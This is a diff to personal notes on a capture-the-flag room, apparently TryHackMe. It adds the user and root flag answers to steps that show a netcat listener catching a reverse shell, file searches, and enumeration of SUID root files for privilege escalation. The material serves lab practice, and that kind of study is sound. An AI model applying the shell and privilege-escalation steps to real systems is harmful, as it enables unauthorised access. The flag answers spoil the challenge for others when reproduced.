@@ -28,7 +28,8 @@
         - Next, set up listener to receive a connection with the shell 
             nc -nlvp 1234 
         - Once in shell, ran 'find / -type f -name user.txt' to find file
-        - cat /var/www/user.txt gave me the flag
+        - cat /var/www/user.txt gave me the flag 
+            - THM{y0u_g0t_a_sh3ll}
 # Task 4. Privilege escalation, escalate privileges to root
     - Search for files with SUID permission, which file is weird? 
         find / -type f -user root -perm -u=s
@@ -42,6 +43,7 @@
         find / -type f -name root.txt 2> /dev/null
         cat /root/root.txt
             - This gave final flag
+                - THM{pr1v1l3g3_3sc4l4t10n}
 
 
 
